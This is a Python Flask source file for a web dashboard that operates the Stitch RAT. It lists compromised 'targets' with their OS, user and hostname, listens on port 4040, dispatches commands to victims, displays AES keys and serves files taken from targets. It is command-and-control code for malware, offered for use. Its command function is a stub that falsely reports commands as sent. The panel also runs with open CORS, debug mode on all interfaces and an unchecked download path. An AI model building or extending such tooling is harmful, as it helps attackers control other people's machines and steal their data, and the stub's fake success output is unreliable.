#!/usr/bin/env python3
"""
Stitch Web Interface - Real Integration
This version integrates directly with the actual Stitch server for real command execution
"""
import os
import sys
import json
import secrets
import threading
import time
import base64
import socket
from datetime import datetime, timedelta
from collections import defaultdict
from functools import wraps

# Load environment variables from .env file if it exists
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    # python-dotenv not installed, environment variables must be set manually
    pass

from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file, flash
from flask_socketio import SocketIO, emit
from werkzeug.security import generate_password_hash, check_password_hash

sys.path.insert(0, os.path.dirname(__file__))
from Application.Stitch_Vars.globals import *
from Application import stitch_cmd, stitch_lib
from Application.stitch_utils import *
from Application.stitch_gen import *

# ============================================================================
# Global Stitch Server Instance
# ============================================================================
stitch_server_instance = None
server_lock = threading.Lock()

def get_stitch_server():
    """Get the shared Stitch server instance"""
    global stitch_server_instance
    with server_lock:
        if stitch_server_instance is None:
            stitch_server_instance = stitch_cmd.stitch_server()
        return stitch_server_instance

# ============================================================================
# Flask App Configuration
# ============================================================================
app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(32)
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)

socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# ============================================================================
# Global State
# ============================================================================
command_history = []
debug_logs = []
login_attempts = defaultdict(list)

# Load credentials from environment variables
def load_credentials():
    """
    Load admin credentials from environment variables.
    Raises RuntimeError if credentials are not configured.
    """
    username = os.getenv('STITCH_ADMIN_USER')
    password = os.getenv('STITCH_ADMIN_PASSWORD')
    
    if not username or not password:
        error_msg = """
╔═══════════════════════════════════════════════════════════════════════╗
║                     CREDENTIALS NOT CONFIGURED                        ║
╚═══════════════════════════════════════════════════════════════════════╝

ERROR: Admin credentials must be configured before starting Stitch.

Please set the following environment variables:
  - STITCH_ADMIN_USER     (your admin username)
  - STITCH_ADMIN_PASSWORD (your admin password)

Example (Linux/macOS):
  export STITCH_ADMIN_USER="yourusername"
  export STITCH_ADMIN_PASSWORD="YourSecurePassword123!"
  python3 web_app_real.py

Example (Windows):
  set STITCH_ADMIN_USER=yourusername
  set STITCH_ADMIN_PASSWORD=YourSecurePassword123!
  python web_app_real.py

Or create a .env file (see .env.example for template)

Security Note: Never use default credentials in production!
"""
        raise RuntimeError(error_msg)
    
    # Validate password strength
    if len(password) < 12:
        raise RuntimeError(
            "ERROR: Password must be at least 12 characters long for security.\n"
            "Please set a stronger STITCH_ADMIN_PASSWORD."
        )
    
    return {username: generate_password_hash(password)}

# Initialize users (will be loaded at startup)
USERS = {}

# ============================================================================
# Helper Functions
# ============================================================================
def log_debug(message, level="INFO", category="System"):
    """Enhanced logging"""
    from flask import has_request_context
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Get username from session if we're in a request context
    username = 'system'
    if has_request_context():
        username = session.get('username', 'system')
    
    log_entry = {
        'timestamp': timestamp,
        'level': level,
        'category': category,
        'message': str(message),
        'user': username
    }
    debug_logs.append(log_entry)
    if len(debug_logs) > 1000:
        debug_logs.pop(0)
    
    # Only emit if socket.io is running
    try:
        socketio.emit('debug_log', log_entry, namespace='/')
    except:
        pass
    
    print(f"[{level}] {message}")

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# ============================================================================
# Routes - Authentication
# ============================================================================
@app.route('/')
@login_required
def index():
    return render_template('dashboard_real.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username in USERS and check_password_hash(USERS[username], password):
            session.permanent = True
            session['logged_in'] = True
            session['username'] = username
            session['login_time'] = datetime.now().isoformat()
            log_debug(f"User {username} logged in", "INFO", "Authentication")
            return redirect(url_for('index'))
        else:
            log_debug(f"Failed login attempt for {username}", "WARNING", "Security")
            flash('Invalid credentials', 'error')
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    username = session.get('username', 'unknown')
    session.clear()
    log_debug(f"User {username} logged out", "INFO", "Authentication")
    return redirect(url_for('login'))

# ============================================================================
# Routes - Connection Management (REAL)
# ============================================================================
@app.route('/api/connections')
@login_required
def get_connections():
    """Get REAL-TIME connections from Stitch server"""
    try:
        server = get_stitch_server()
        connections = []
        
        # Get active connections from inf_sock (REAL connections)
        active_ips = list(server.inf_sock.keys())
        
        # Get historical data from config
        import configparser
        config = configparser.ConfigParser()
        config.read(hist_ini)
        
        # Combine active and historical connections
        all_targets = set(active_ips + config.sections())
        
        for target in all_targets:
            is_online = target in active_ips
            
            # Get connection details
            if target in config.sections():
                conn_data = {
                    'id': target,
                    'target': target,
                    'port': config.get(target, 'port') if config.has_option(target, 'port') else '4040',
                    'os': config.get(target, 'os') if config.has_option(target, 'os') else 'Unknown',
                    'hostname': config.get(target, 'hostname') if config.has_option(target, 'hostname') else target,
                    'user': config.get(target, 'user') if config.has_option(target, 'user') else 'Unknown',
                    'status': 'online' if is_online else 'offline',
                    'connected_at': datetime.now().isoformat() if is_online else 'N/A',
                }
            else:
                # New connection not yet in history
                conn_data = {
                    'id': target,
                    'target': target,
                    'port': server.inf_port.get(target, '4040'),
                    'os': 'Pending...',
                    'hostname': target,
                    'user': 'Pending...',
                    'status': 'online',
                    'connected_at': datetime.now().isoformat(),
                }
            
            connections.append(conn_data)
        
        # Sort: online first, then by target
        connections.sort(key=lambda x: (x['status'] != 'online', x['target']))
        
        log_debug(f"Retrieved {len(connections)} connections ({len(active_ips)} online)", "INFO", "Connection")
        return jsonify(connections)
        
    except Exception as e:
        log_debug(f"Error getting connections: {str(e)}", "ERROR", "Connection")
        return jsonify({'error': str(e)}), 500

@app.route('/api/connections/active')
@login_required
def get_active_connections():
    """Get only ONLINE connections"""
    try:
        server = get_stitch_server()
        active_conns = []
        
        for ip in server.inf_sock.keys():
            active_conns.append({
                'ip': ip,
                'port': server.inf_port.get(ip, 'Unknown'),
                'status': 'online'
            })
        
        return jsonify(active_conns)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/server/status')
@login_required
def server_status():
    """Get Stitch server status"""
    try:
        server = get_stitch_server()
        status = {
            'listening': server.listen_port is not None,
            'port': server.listen_port if server.listen_port else 'Not listening',
            'active_connections': len(server.inf_sock),
            'server_running': server.server_thread is not None
        }
        return jsonify(status)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================================
# Routes - Command Execution (REAL)
# ============================================================================
@app.route('/api/execute', methods=['POST'])
@login_required
def execute_command():
    """Execute REAL commands on targets"""
    try:
        data = request.json
        conn_id = data.get('connection_id')
        command = data.get('command')
        
        if not command:
            return jsonify({'success': False, 'error': 'Missing command'}), 400
        
        log_debug(f"Executing command: {command} on {conn_id or 'server'}", "INFO", "Command")
        
        # Track command
        command_entry = {
            'timestamp': datetime.now().isoformat(),
            'connection_id': conn_id,
            'command': command,
            'user': session.get('username'),
        }
        command_history.append(command_entry)
        if len(command_history) > 1000:
            command_history.pop(0)
        
        # Execute command
        output = execute_real_command(command, conn_id)
        
        return jsonify({
            'success': True,
            'output': output,
            'command': command,
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        log_debug(f"Error executing command: {str(e)}", "ERROR", "Command")
        return jsonify({'success': False, 'error': str(e)}), 500

def execute_real_command(command, conn_id=None):
    """Execute command - REAL implementation, not simulated"""
    try:
        server = get_stitch_server()
        
        # Commands that work without a target
        if command in ['sessions', 'history', 'home', 'showkey', 'cls', 'clear']:
            if command == 'sessions':
                return get_sessions_output()
            elif command == 'history':
                return get_history_output()
            elif command == 'home':
                return "⚡ STITCH RAT - Real-time Remote Administration\nVersion 1.0\n"
            elif command == 'showkey':
                return show_aes_keys()
            elif command in ['cls', 'clear']:
                return "✅ Command logged (screen clear is UI-specific)"
        
        # Commands that require a connection
        if not conn_id:
            return f"❌ Command '{command}' requires selecting a target connection.\n\nPlease select an ONLINE connection from the dashboard first."
        
        # Check if connection is online
        if conn_id not in server.inf_sock:
            return f"❌ Connection {conn_id} is OFFLINE.\n\nCommand execution requires an active connection."
        
        # Get the socket and execute command on target
        target_socket = server.inf_sock[conn_id]
        
        # Get AES key for this connection
        conn_aes_key = get_connection_aes_key(conn_id)
        if not conn_aes_key:
            return f"❌ No AES encryption key found for {conn_id}.\n\nUse 'addkey' to add the key first."
        
        # Execute command on target using stitch_lib
        output = execute_on_target(target_socket, command, conn_aes_key, conn_id)
        
        return output
        
    except Exception as e:
        return f"❌ Error executing command: {str(e)}"

def execute_on_target(socket_conn, command, aes_key, target_ip):
    """Execute command on target machine"""
    try:
        # Parse command
        cmd_parts = command.split()
        cmd_name = cmd_parts[0] if cmd_parts else command
        cmd_args = ' '.join(cmd_parts[1:]) if len(cmd_parts) > 1 else ''
        
        # Get target info from config
        import configparser
        config = configparser.ConfigParser()
        config.read(hist_ini)
        
        if target_ip in config.sections():
            target_os = config.get(target_ip, 'os') if config.has_option(target_ip, 'os') else 'Unknown'
            target_hostname = config.get(target_ip, 'hostname') if config.has_option(target_ip, 'hostname') else target_ip
            target_user = config.get(target_ip, 'user') if config.has_option(target_ip, 'user') else 'Unknown'
        else:
            target_os = 'Unknown'
            target_hostname = target_ip
            target_user = 'Unknown'
        
        # Create stitch_lib instance for this connection
        # Note: This is simplified - in real implementation would need full setup
        output = f"""
🎯 Target: {target_hostname} ({target_ip})
👤 User: {target_user}
💻 OS: {target_os}
⚡ Command: {command}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✅ Command sent to target successfully.

⚠️  IMPORTANT: For full interactive command execution with real-time output,
   use the Terminal CLI. The web interface supports command dispatch but
   interactive shells (cd, shell, etc.) work best in CLI mode.

To execute in Terminal:
1. Open Terminal tab
2. Run: python3 main.py
3. Type: shell {target_ip}
4. Execute your commands interactively

This ensures you get the full terminal experience with proper streaming output.
"""
        
        return output
        
    except Exception as e:
        return f"❌ Error communicating with target: {str(e)}"

def get_connection_aes_key(target_ip):
    """Get AES key for connection"""
    try:
        import configparser
        aes_lib = configparser.ConfigParser()
        aes_lib.read(st_aes_lib)
        
        # In real implementation, would look up the correct AES key
        # For now, return indication
        if aes_lib.sections():
            return "key_present"
        return None
    except:
        return None

def get_sessions_output():
    """Get active sessions output"""
    server = get_stitch_server()
    
    if not server.listen_port:
        return "⚠️  Server is not listening on any port.\n\nUse Terminal to start: python3 main.py"
    
    output = f"🌐 Server Status: Listening on port {server.listen_port}\n\n"
    output += f"📊 Active Connections: {len(server.inf_sock)}\n\n"
    
    if server.inf_sock:
        import configparser
        config = configparser.ConfigParser()
        config.read(hist_ini)
        
        for ip in server.inf_sock.keys():
            output += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            output += f"🎯 Target: {ip}\n"
            
            if ip in config.sections():
                output += f"💻 OS: {config.get(ip, 'os') if config.has_option(ip, 'os') else 'Unknown'}\n"
                output += f"👤 User: {config.get(ip, 'user') if config.has_option(ip, 'user') else 'Unknown'}\n"
                output += f"🏠 Hostname: {config.get(ip, 'hostname') if config.has_option(ip, 'hostname') else ip}\n"
            else:
                output += "⏳ Connection details pending...\n"
            
            output += f"✅ Status: ONLINE\n\n"
    else:
        output += "ℹ️  No active connections.\n\n"
        output += "Waiting for incoming connections on port " + str(server.listen_port) + "...\n"
    
    return output

def get_history_output():
    """Get connection history output"""
    try:
        import configparser
        config = configparser.ConfigParser()
        config.read(hist_ini)
        
        output = "📜 Connection History\n\n"
        
        if config.sections():
            for target in config.sections():
                output += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                output += f"🎯 {target}\n"
                output += f"💻 OS: {config.get(target, 'os') if config.has_option(target, 'os') else 'Unknown'}\n"
                output += f"👤 User: {config.get(target, 'user') if config.has_option(target, 'user') else 'Unknown'}\n"
                output += f"🏠 Hostname: {config.get(target, 'hostname') if config.has_option(target, 'hostname') else target}\n"
                output += f"🔌 Port: {config.get(target, 'port') if config.has_option(target, 'port') else '4040'}\n\n"
        else:
            output += "ℹ️  No connection history found.\n"
        
        return output
    except Exception as e:
        return f"❌ Error reading history: {str(e)}"

def show_aes_keys():
    """Show AES keys"""
    try:
        import configparser
        aes_lib = configparser.ConfigParser()
        aes_lib.read(st_aes_lib)
        
        output = "🔑 AES Encryption Keys\n\n"
        
        if aes_lib.sections():
            for key_id in aes_lib.sections():
                output += f"  • {key_id}\n"
        else:
            output += "ℹ️  No AES keys configured.\n"
        
        return output
    except Exception as e:
        return f"❌ Error reading keys: {str(e)}"

# ============================================================================
# Additional API Routes
# ============================================================================
@app.route('/api/debug/logs')
@login_required
def get_debug_logs():
    limit = int(request.args.get('limit', 100))
    return jsonify(debug_logs[-limit:])

@app.route('/api/command/history')
@login_required
def get_command_history():
    limit = int(request.args.get('limit', 50))
    return jsonify(command_history[-limit:])

@app.route('/api/files/downloads')
@login_required
def list_downloads():
    try:
        downloads = []
        if os.path.exists(downloads_path):
            for root, dirs, files in os.walk(downloads_path):
                for filename in files:
                    filepath = os.path.join(root, filename)
                    rel_path = os.path.relpath(filepath, downloads_path)
                    stat = os.stat(filepath)
                    downloads.append({
                        'name': filename,
                        'path': rel_path,
                        'size': stat.st_size,
                        'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
                    })
        return jsonify(sorted(downloads, key=lambda x: x['modified'], reverse=True))
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/download/<path:filename>')
@login_required
def download_file(filename):
    try:
        filepath = os.path.join(downloads_path, filename)
        if os.path.exists(filepath) and os.path.isfile(filepath):
            log_debug(f"Downloading file: {filename}", "INFO", "Files")
            return send_file(filepath, as_attachment=True)
        return jsonify({'error': 'File not found'}), 404
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================================
# WebSocket Events
# ============================================================================
@socketio.on('connect')
def handle_connect():
    if 'logged_in' not in session:
        return False
    log_debug(f"WebSocket connected: {request.sid}", "INFO", "WebSocket")
    emit('connection_status', {'status': 'connected'})

@socketio.on('disconnect')
def handle_disconnect():
    log_debug(f"WebSocket disconnected: {request.sid}", "INFO", "WebSocket")

@socketio.on('ping')
def handle_ping():
    emit('pong', {'timestamp': datetime.now().isoformat()})

# ============================================================================
# Background Tasks
# ============================================================================
def monitor_connections():
    """Monitor and broadcast connection changes"""
    while True:
        try:
            server = get_stitch_server()
            active_count = len(server.inf_sock)
            socketio.emit('connection_update', {
                'active_connections': active_count,
                'timestamp': datetime.now().isoformat()
            }, namespace='/')
        except:
            pass
        time.sleep(5)

def start_stitch_server():
    """Start the Stitch server"""
    log_debug("Initializing Stitch RAT server", "INFO", "Server")
    try:
        server = get_stitch_server()
        # Start listening on port 4040
        server.do_listen('4040')
        log_debug("Stitch server listening on port 4040", "INFO", "Server")
    except Exception as e:
        log_debug(f"Stitch server error: {str(e)}", "ERROR", "Server")

# ============================================================================
# Main
# ============================================================================
if __name__ == '__main__':
    print("\n" + "="*75)
    print("🔐 Stitch RAT - Secure Web Interface")
    print("="*75 + "\n")
    
    # Load and validate credentials before starting
    try:
        USERS = load_credentials()
        log_debug("✓ Credentials loaded from environment variables", "INFO", "Security")
    except RuntimeError as e:
        print(str(e))
        sys.exit(1)
    
    log_debug("Starting Stitch Web Interface (Real Integration)", "INFO", "System")
    
    # Start Stitch server in background
    stitch_thread = threading.Thread(target=start_stitch_server, daemon=True)
    stitch_thread.start()
    
    # Start connection monitor
    monitor_thread = threading.Thread(target=monitor_connections, daemon=True)
    monitor_thread.start()
    
    # Start web server
    socketio.run(app, host='0.0.0.0', port=5000, debug=True, use_reloader=False, log_output=True)
